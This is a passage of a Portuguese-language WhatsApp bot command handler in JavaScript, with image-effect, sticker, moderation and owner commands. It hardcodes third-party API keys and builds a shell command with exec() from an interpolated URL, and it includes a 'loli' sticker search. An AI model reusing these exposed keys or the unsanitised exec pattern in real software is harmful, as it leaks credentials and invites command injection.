                    anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/americanflag?texto=${texto}&apikey=edwardbot22`)
                    buffer = await getBuffer(anu.resultado)
                    edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                    break
                     
                     case 'galaxy':  //by Ꮥꪖꪗꪮ </>
                    cf = `${body.slice(8)}`
                
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} ${NomeBot}`)
                 
                    anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/galaxystyle?texto=${cf}&apikey=edwardbot22`)
                    buffer = await getBuffer(anu.resultado)
                    edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                    break
                     
                     case 'stone':  //by Ꮥꪖꪗꪮ </>
                    cf = `${body.slice(6)}`
                
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} ${NomeBot}`)
                    anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/stone?texto=${cf}&apikey=edwardbot22`)
                    buffer = await getBuffer(anu.resultado)
                    edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                    break
                     case 'grafite':  //by Ꮥꪖꪗꪮ </>
                    cf = `${body.slice(8)}`
                
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} ed bot`)
                    texto1 = args[0]
                    texto2 = args[1]
                    anu = await getBuffer(`https://akame-api.herokuapp.com/api/ephoto/grafite?texto=${texto1}&texto2=${texto2}&apikey=edwardbot22`)
                    buffer = await getBuffer(anu.resultado)
                    edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                    break
                     case 'pornhub': 
                    cf = `${body.slice(8)}`
                
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} ed bot`)
                    texto1 = args[0]
                    texto2 = args[1]
                    anu = await getBuffer(`https://api.zeks.me/api/phlogo?apikey=levibot2021&text1=${texto1}&text2=${texto2}`)
                    buffer = await getBuffer(anu.resultado)
                    edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                    break
                     case 'matrix':  //by Ꮥꪖꪗꪮ </>
                    cf = `${body.slice(7)}`
                
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} ed`)
                    anu = await getBuffer(`https://api.zeks.me/api/matrix?apikey=levibot2021&text=${cf}`)
                    buffer = await getBuffer(anu.resultado)
                    edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                    break
                     case 'marvel':  //by Ꮥꪖꪗꪮ </>
                    cf = `${body.slice(6)}`
                
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} ed bot`)
                    texto1 = args[0]
                    texto2 = args[1]
                    anu = await getBuffer(`https://api.zeks.me/api/marvellogo?apikey=levibot2021&text1=${texto1}&text2=${texto2}`)
                    buffer = await getBuffer(anu.resultado)
                    edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                    break
                     case 'matrix':  //by Ꮥꪖꪗꪮ </>
                    cf = `${body.slice(7)}`
                
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} ed`)
                    anu = await getBuffer(`https://api.zeks.me/api/matrix?apikey=levibot2021&text=${cf}`)
                    buffer = await getBuffer(anu.resultado)
                    edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                    break
                     case 'pubg':  //by Ꮥꪖꪗꪮ </>
                    cf = `${body.slice(5)}`
                
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} ${NomeBot}`)
                
               
                    anu = await getBuffer(`https://akame-api.herokuapp.com/api/ephoto/pubgv?texto=${cf}&apikey=edwardbot22`)
                  
                    edward.sendMessage(from, anu, video, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                    break
                     case 'tigre':  //by Ꮥꪖꪗꪮ </>
                    cf = `${body.slice(6)}`
                
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} ${NomeBot}`)
    
                    anu = await getBuffer(`https://akame-api.herokuapp.com/api/ephoto/trigrev?texto=${cf}&apikey=edwardbot22`)
                  
                    edward.sendMessage(from, anu, video, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                    break
                    
                     
                     case 'space':  //by Ꮥꪖꪗꪮ </>
                    cf = `${body.slice(7)}`
                    
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} ${NomeBot}`)
                    
                    anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/spacetext?texto=${cf}&apikey=edwardbot22`)
                    buffer = await getBuffer(anu.resultado)
                    edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                    break
                   
                     
                    
                    case 'ninjalogo':  //by Ꮥꪖꪗꪮ </>
                    cf = `${body.slice(8)}`
                
                    if (args.length == 0) return reply(`Exemplo: ${prefix + command} ed bot`)
                    texto1 = args[0]
                    texto2 = args[1]
                    anu = await getBuffer(`https://akame-api.herokuapp.com/api/textpro/ninjalogo?texto=${texto1}&texto2=${texto2}&apikey=edwardbot22`)
                    buffer = await getBuffer(anu.resultado)
                    edward.sendMessage(from, anu, image, {caption: `Aqui está!! 🤠`, quoted: mek, thumbnail: null})
                    break                    
               
      ////////////////// //////   //      
case 'rip':

if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Marque a msg da pessoa!')

pessoamensionada = mek.message.extendedTextMessage.contextInfo.participant
try {
perfildapessoa = await edward.getProfilePicture(pessoamensionada)
} catch {
perfildapessoa = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
perfildapessoabuff = await getBuffer(perfildapessoa)
ran = getRandom('.jpg')
rano = getRandom('.jpg')
fs.writeFileSync(ran, perfildapessoabuff)
anu = await TelegraPh(ran)
//${util.format(anu)}
teste = `*_Puxando a ficha do @${pessoamensionada.split('@')[0]} 😳_*`
mentions(teste, pessoamensionada, true)
setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
anu1 = await getBuffer(`https://akame-api.herokuapp.com/api/canvas/rip?img=${util.format(anu)}&apikey=edwardbot22`)
edward.sendMessage(from, anu1, image, {quoted: mek, caption: `Morte aos:  ${random} anos`})
}, )
break

case 'figupreso':
case 'sjail':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://akame-api.herokuapp.com/api/canvas/jail?img=${imgtrg}&apikey=edwardbot22`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
await fs.unlinkSync(fdsllkklk)
} else if (budy.match(`eu`)) {
ran = getRandom('.jpg')
rano = getRandom('.jpg')
fs.writeFileSync(ran, pperfil)
anu = await TelegraPh(ran)
//${util.format(anu)}
anu1 = `https://akame-api.herokuapp.com/api/canvas/jail?img=${util.format(anu)}&apikey=edwardbot22`
sendStickerUrl(from, anu1).catch(() => reply('Deu erro 😢'))
} else {
reply(`Você precisa marcar ou enviar uma imagem para isso\n\n ou digitar eu`)}
break
case 'figugay':
case 'slgbtq':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://akame-api.herokuapp.com/api/canvas/gay?img=${util.format(anu)}&apikey=edwardbot22`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
await fs.unlinkSync(fdsllkklk)
} else if (budy.match(`eu`)) {
ran = getRandom('.jpg')
rano = getRandom('.jpg')
fs.writeFileSync(ran, pperfil)
anu = await TelegraPh(ran)
//${util.format(anu)}
anu1 = `https://akame-api.herokuapp.com/api/canvas/gay?img=${util.format(anu)}&apikey=edwardbot22`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
} else {
reply(`Você precisa marcar ou enviar uma imagem para isso\n\n ou digitar eu`)}
break
case 'figublur':
case 'sblur':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://akame-api.herokuapp.com/api/canvas/blur?img=${util.format(anu)}&apikey=edwardbot22`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
await fs.unlinkSync(fdsllkklk)
} else if (budy.match(`eu`)) {
ran = getRandom('.jpg')
rano = getRandom('.jpg')
fs.writeFileSync(ran, pperfil)
anu = await TelegraPh(ran)
//${util.format(anu)}
anu1 = `https://akame-api.herokuapp.com/api/canvas/blur?img=${util.format(anu)}&apikey=edwardbot22`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
} else {
reply(`Você precisa marcar ou enviar uma imagem para isso\n\n ou digitar eu`)}
break
case 'figuinvertido':
case 'sinvert':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://akame-api.herokuapp.com/api/canvas/invert?img=${util.format(anu)}&apikey=edwardbot22`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
await fs.unlinkSync(fdsllkklk)
} else if (budy.match(`eu`)) {
ran = getRandom('.jpg')
rano = getRandom('.jpg')
fs.writeFileSync(ran, pperfil)
anu = await TelegraPh(ran)
//${util.format(anu)}
anu1 = `https://akame-api.herokuapp.com/api/canvas/invert?img=${util.format(anu)}&apikey=edwardbot22`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
} else {
reply(`Você precisa marcar ou enviar uma imagem para isso\n\n ou digitar eu`)}
break
case 'figusepia':
case 'ssepia':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://akame-api.herokuapp.com/api/canvas/sepia?img=${util.format(anu)}&apikey=edwardbot22`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
await fs.unlinkSync(fdsllkklk)
} else if (budy.match(`eu`)) {
ran = getRandom('.jpg')
rano = getRandom('.jpg')
fs.writeFileSync(ran, pperfil)
anu = await TelegraPh(ran)
//${util.format(anu)}
anu1 = `https://akame-api.herokuapp.com/api/canvas/sepia?img=${util.format(anu)}&apikey=edwardbot22`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
} else {
reply(`Você precisa marcar ou enviar uma imagem para isso\n\n ou digitar eu`)}
break
case 'figudc':
case 'sdc':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://akame-api.herokuapp.com/api/canvas/discordBlack?img=${util.format(anu)}&apikey=edwardbot22`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
await fs.unlinkSync(fdsllkklk)
} else if (budy.match(`eu`)) {
ran = getRandom('.jpg')
rano = getRandom('.jpg')
fs.writeFileSync(ran, pperfil)
anu = await TelegraPh(ran)
//${util.format(anu)}
anu1 = `https://akame-api.herokuapp.com/api/canvas/discordBlack?img=${util.format(anu)}&apikey=edwardbot22`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
} else {
reply(`Você precisa marcar ou enviar uma imagem para isso\n\n ou digitar eu`)}
break
case 'figudcb':
case 'sdcb':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://akame-api.herokuapp.com/api/canvas/discordBlue?img=${util.format(anu)}&apikey=edwardbot22`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
await fs.unlinkSync(fdsllkklk)
} else if (budy.match(`eu`)) {
ran = getRandom('.jpg')
rano = getRandom('.jpg')
fs.writeFileSync(ran, pperfil)
anu = await TelegraPh(ran)
//${util.format(anu)}
anu1 = `https://akame-api.herokuapp.com/api/canvas/discordBlue?img=${util.format(anu)}&apikey=edwardbot22`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
} else {
reply(`Você precisa marcar ou enviar uma imagem para isso\n\n ou digitar eu`)}
break
case 'figutrigger':
   case 'triggered':
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        reply(mess.wait)
                   
                        owgi = await edward.downloadAndSaveMediaMessage(ger)
                        anu = await imgbb("f2d03a801441d9021abfe0fa5e46385e", owgi)
                        imgtrg = `${anu.display_url}`
                        ranp = getRandom('.gif')
                        rano = getRandom('.webp')
                        anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${imgtrg}`
                        exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                            fs.unlinkSync(ranp)
                            if (err) return reply(mess.error)
                            nobg = fs.readFileSync(rano)
                            edward.sendMessage(from, nobg, sticker, {
                                quoted: mek
                            })
                            fs.unlinkSync(rano)
                        })
                    } else {
                        reply('Você precisa marcar ou enviar uma imagem para isso')
                    }
                    break

   
case 'figuovo':
case 'sovo':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://akame-api.herokuapp.com/api/canvas/mms?img=${util.format(anu)}&apikey=edwardbot22`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
await fs.unlinkSync(fdsllkklk)
} else if (budy.match(`eu`)) {
ran = getRandom('.jpg')
rano = getRandom('.jpg')
fs.writeFileSync(ran, pperfil)
anu = await TelegraPh(ran)
//${util.format(anu)}
anu1 = `https://akame-api.herokuapp.com/api/canvas/mms?img=${util.format(anu)}&apikey=edwardbot22`
sendStickerUrl(from, `${anu1}`).catch(() => reply('Deu erro 😢'))
} else {
reply(`Você precisa marcar ou enviar uma imagem para isso\n\n ou digitar eu`)}
break
case 'figusrc':
if (!c) return reply('Escreva o nome da figurinha...')
pinterest(`${c}`).then( data => {
const figurinha = data.result
const figurinha_aleatoria = figurinha[Math.floor(Math.random() * figurinha.length)]
sendStickerUrl(from, figurinha_aleatoria)
})
break
 
break
case 'figuloli':
pinterest(`anime loli icon`).then( data => {
const figurinha = data.result
const figurinha_aleatoria = figurinha[Math.floor(Math.random() * figurinha.length)]
sendStickerUrl(from, figurinha_aleatoria)
})
break
case 'figuneko':
pinterest(`anime neko icon`).then( data => {
const figurinha = data.result
const figurinha_aleatoria = figurinha[Math.floor(Math.random() * figurinha.length)]
sendStickerUrl(from, figurinha_aleatoria)
})
break
case 'figuanime':
pinterest(`anime icon perfil`).then( data => {
const figurinha = data.result
const figurinha_aleatoria = figurinha[Math.floor(Math.random() * figurinha.length)]
sendStickerUrl(from, figurinha_aleatoria)
})
break
case 'editraimbow':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://akame-api.herokuapp.com/api/canvas/gay?img=${util.format(anu)}&apikey=edwardbot22`
sendFileFromUrl(anu1, image, {quoted: mek, caption: `🏳️‍🌈 LGBTQ 🏳️‍🌈`})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')}
break
case 'editdrip':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://api-exteam.herokuapp.com/api/dripp?img=${util.format(anu)}`
sendFileFromUrl(anu1, image, {quoted: mek, caption: `Eu tenho o molho 😎`})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')}
break

case 'editwanted':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://api-exteam.herokuapp.com/api/procurado?img=${util.format(anu)}`
sendFileFromUrl(anu1, image, {quoted: mek, caption: `🤠`})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')}
break
case 'removebg':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://docs-jojo.herokuapp.com/api/remove-bg?url=${util.format(anu)}`
sendFileFromUrl(anu1, image, {quoted: mek, caption: `🤠`})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')}
break
case 'edittrash':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://api-exteam.herokuapp.com/api/trash?img=${util.format(anu)}`
sendFileFromUrl(anu1, image, {quoted: mek, caption: `🤠`})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')}
break
case 'editblur':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://akame-api.herokuapp.com/api/canvas/blur?img=${util.format(anu)}&apikey=edwardbot22`
sendFileFromUrl(anu1, image, {quoted: mek, caption: `😵‍💫 _*EMBAÇADO*_ 😵‍💫`})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')}
break
case 'editshit':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://api-exteam.herokuapp.com/api/shit?img=${util.format(anu)}`
sendFileFromUrl(anu1, image, {quoted: mek, caption: `🚮`})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')}
break
case 'editblur':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://akame-api.herokuapp.com/api/canvas/blur?img=${util.format(anu)}&apikey=edwardbot22`
sendFileFromUrl(anu1, image, {quoted: mek, caption: `😵‍💫 _*EMBAÇADO*_ 😵‍💫`})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')}
break
case 'editinvert':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://akame-api.herokuapp.com/api/canvas/invert?img=${util.format(anu)}&apikey=edwardbot22`
sendFileFromUrl(anu1, image, {quoted: mek, caption: `👾 _*CORES INVERTIDAS*_ 👾`})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')}
break
case 'editsepia':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://akame-api.herokuapp.com/api/canvas/sepia?img=${util.format(anu)}&apikey=edwardbot22`
sendFileFromUrl(anu1, image, {quoted: mek, caption: `🔴 _*SÉPIA*_ 🔴`})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')}
break
case 'editrosto':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
const fdsllkklk = await edward.downloadAndSaveMediaMessage(encmedia, `./${sender}`)
let anu = await TelegraPh(fdsllkklk)
anu1 = `https://akame-api.herokuapp.com/api/canvas/karaba?img=${util.format(anu)}&apikey=edwardbot22`
sendFileFromUrl(anu1, image, {quoted: mek, caption: `🤠 *_KARABA_* 🤠`})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')}
break

				case 'd':
				case 'del':
				case 'delete':
					edward.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
				case 'colong':
				case 'roubar':
		if (!isQuotedSticker) return reply(`Marque uma figurinha, é use: *${prefix + command}*`)
		const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        const meidia = await edward.downloadAndSaveMediaMessage(encmediia, `./figurinha_exif/${sender}`)
		    exec(`webpmux -set exif ./figurinha_exif/data.exif ./figurinha_exif/${sender}.webp -o ./figurinha_exif/${sender}.webp`, async (error) => {
		    if (error) return reply('error')
		    edward.sendMessage(from, fs.readFileSync(`./figurinha_exif/${sender}.webp`), MessageType.sticker, {quoted: mek})
					fs.unlinkSync(meidia)
					fs.unlinkSync(`./figurinha_exif/takestick_${sender}.exif`)
				})
				break
				case 'readmore':
			    	case 'more':
			    	case 'lermais':
			    	const more = String.fromCharCode(8206)
			    	const readmore = more.repeat(4001)
				    if (!c.includes('|')) return  reply(`você está fzd do jeito errado :/\nuse assim: ${prefix + command} Te|Amo`)
                    const text1 = c.substring(0, c.indexOf('|') - 0)
                    const text2 = c.substring(c.lastIndexOf('|') + 1)
                    reply( text1 + readmore + text2)
                    break
                    case 'delchat':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                reply(`Sucesso ao excluir este chat...\nID: ${from}`)
                await sleep(4000)
                edward.modifyChat(from, ChatModification.delete)
                break
case 'limparchat':
case 'clearall':
case 'limpar':
case 'limpa':{
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
let chiit = await edward.chats.all()
for (let i of chiit){
edward.modifyChat(i.jid, 'delete', {
includeStarred: false
  })
}
reply(`*_Pronto_*`)
}
break
					case 'mute':
					case 'mutar':
					case 'bangp':
			    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
			    if (!isGroup) return reply(mess.only.group)
                if (isMuted) return reply(`O grupo já esta banido`)
                mute.push(from)
                fs.writeFileSync('./db/grupo_db/mute.json', JSON.stringify(mute))
                if (command => bangp) return reply(`O grupo foi banido com sucesso`)
                if (command => banchat) return reply(`O chat foi banido com sucesso`) //AAAA SLA NÃO SEI OQ FIZ AQUIKKK
                if (command => mute) return reply(`O grupo foi mutado com sucesso`)
                break
case 'restart':
case 'reiniciar':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
reply(`_Reiniciando o(a) ${NomeBot}_`)
exec(`cd &&  node index`)
sleep(4000)
reply('Pronto ☕')
break
				case 'detikvn':
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await edward.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						edward.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await edward.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						edward.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
						fs.unlinkSync(median)
				break
				 case 'antilink':
	        if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (Number(args[0]) === 1) {
						if (isAntilink) return reply(`O ${command} já está ativado!!!`)
						antilink.push(from)
						fs.writeFileSync('./db/anti_db/antilink.json', JSON.stringify(antilink))
						reply(`❗${command} foi ativado com sucesso 🪀`)
						replyinvisiveltag(from, `❗ALERTA!!!❗\n Modo antilink foi ativado nesse grupo`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntilink) return reply('Já esta desativado')
						var ini = antilink.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./db/anti_db/antilink.json', JSON.stringify(antilink))
						reply(`O ${command} foi desativado com sucesso 🤔`)
						replyinvisiveltag(from, `*Podem enviar links avontade fml 😂*`, text)
	} else if (!c) {
sendButMessage(
from,
`❗ANTILINK 💢`,
`Selecione abaixo`,
[
{
buttonId: `antilink 1`,
buttonText: {
displayText: `ONLINE 🤠`,
},
type: 1,
},
{
buttonId: `antilink 0`,
buttonText: {
displayText: `OFFLINE  💔`,
},
type: 1,
},
]
);
}
break
             /* case 'leveling':
              if (!isGroup) return reply(mess.only.group)
              if (args[0] === 'on') {
              if (isLevelingOn) return reply('O Modo leveling ja esta ativado...')
            _leveling.push(from)
              fs.writeFileSync('./db/grupo_db/leveling.json', JSON.stringify(_leveling))
              reply(`❗${command} foi ativado com sucesso 🪀`)
              } else if (args[0] === 'off') {
              var anup = _leveling.indexOf(from)
            _leveling.splice(anup, 1)
              fs.writeFileSync('./db/grupo_db/leveling.json', JSON.stringify(_leveling))
              reply(`O ${command} foi desativado com sucesso 🤔`)
	} else if (!c) {
sendButMessage(
from,
`✨LEVELING 🌫️`,
`Selecione abaixo`,
[
{
buttonId: `${command} on`,
buttonText: {
displayText: `ONLINE 🤠`,
},
type: 1,
},
{
buttonId: `${command} off`,
buttonText: {
displayText: `OFFLINE  💔`,
},
type: 1,
},
]
);
}
break*/
case 'autofigurinha':
	   if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (Number(args[0]) === 1) {
						if (isAutofigu) return reply(`O ${command} já está ativado!!!`)
						autofigurinha.push(from)
						fs.writeFileSync('./db/grupo_db/autofigurinha.json', JSON.stringify(autofigurinha))
						reply(`❗${command} foi ativado com sucesso 🪀`)
					} else if (Number(args[0]) === 0) {
						if (!isAutofigu) return reply('Já esta desativado')
						var ini = autofigurinha.indexOf(from)
						autofigurinha.splice(ini, 1)
						fs.writeFileSync('./db/grupo_db/autofigurinha.json', JSON.stringify(autofigurinha))
						reply(`O ${command} foi desativado com sucesso 🤔`)
	} else if (!c) {
sendButMessage(
from,
`❗AUTO FIGURINHA 💢`,
`Selecione abaixo`,
[
{
buttonId: `autofigurinha 1`,
buttonText: {
displayText: `ONLINE 🤠`,
},
type: 1,
},
{
buttonId: `autofigurinha 0`,
buttonText: {
displayText: `OFFLINE  💔`,
},
type: 1,
},
]
);
}
break
case 'antipv':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
           if (c === 'on'){
              antipv = true
                    reply(`Anti pv foi ativado com sucesso`)
                } else if (c === 'off'){
                    antipv = false
                    reply(`Anti pv foi desativado com sucesso`)
                      	} else if (!c) {
sendButMessage(
from,
`❌ANTI PV❗️`,
`Selecione abaixo`,
[
{
buttonId: `antipv on`,
buttonText: {
displayText: `ONLINE 🤠`,
},
type: 1,
},
{
buttonId: `antipv off`,
buttonText: {
displayText: `OFFLINE  💔`,
},
type: 1,
},
]
